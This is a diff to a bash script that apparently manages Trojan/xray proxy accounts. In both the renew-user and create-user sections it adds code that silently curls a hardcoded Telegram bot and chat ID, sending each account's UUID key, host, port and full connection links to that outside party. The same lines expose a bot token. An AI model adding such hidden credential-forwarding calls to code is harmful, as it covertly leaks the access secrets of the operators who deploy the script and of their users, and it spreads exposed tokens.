@@ -232,6 +232,26 @@ if [[ "${DATADB}" != '' ]]; then
   sed -i "/\b${user}\b/d" /etc/trojan/.trojan.db
 fi
 echo "#! ${user} ${exp} ${uuid} " >>/etc/trojan/.trojan.db
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+┌──────────────────────────────┐
+│     • RENEW TROJAN USER •               
+└──────────────────────────────┘
+┌──────────────────────────────┐
+$user Account Renewed Successfully
+
+Client Name : <code>$user</code>
+Days Added  : <code>$masaaktif Days</code>
+Expired On  : <code>$exp4</code>
+└──────────────────────────────┘
+┌───────────── BY ─────────────┐
+│        • Free-Wifi •                 
+└──────────────────────────────┘
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
 echo -e "$COLOR1│${NC} ${COLBG1}            • RENEW TROJAN USER •              ${NC} $COLOR1│$NC"
@@ -300,6 +320,38 @@ sed -i '/#trojangrpc$/a\#! '"$user $exp"'\
 systemctl restart xray
 trojanlink1="trojan://${uuid}@${domain}:${tr}?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=${domain}#${user}"
 trojanlink="trojan://${uuid}@bug.com:${tr}?path=%2Ftrojan-ws&security=tls&host=${domain}&type=ws&sni=${domain}#${user}"
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+┌──────────────────────────────┐
+│     • CREATE TROJAN USER •               
+└──────────────────────────────┘
+┌──────────────────────────────┐
+  Remarks     : <code>${user}</code>
+  Expired On  : <code>$exp</code>
+  Host/IP     : <code>${domain}</code>
+  Limit Quota : <code>${quota} GB</code>
+  Limit iP    : <code>${limit} USER</code>
+  Port        : <code>${tr}</code>
+  Key         : <code>${uuid}</code>
+  Path        : <code>/trojan-ws</code>
+  Path WSS    : <code>wss://bug.com/trojan-ws</code>
+  ServiceName : <code>trojan-grpc</code>
+└──────────────────────────────┘
+┌──────────────────────────────┐
+  Link WS : 
+  <code>${trojanlink}</code>
+  
+  Link GRPC : 
+  <code>${trojanlink1}</code>
+└──────────────────────────────┘
+┌───────────── BY ─────────────┐
+│        • Free-Wifi •                 
+└──────────────────────────────┘
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
 echo -e "$COLOR1│${NC} ${COLBG1}           • CREATE TROJAN USER •              ${NC} $COLOR1│$NC"
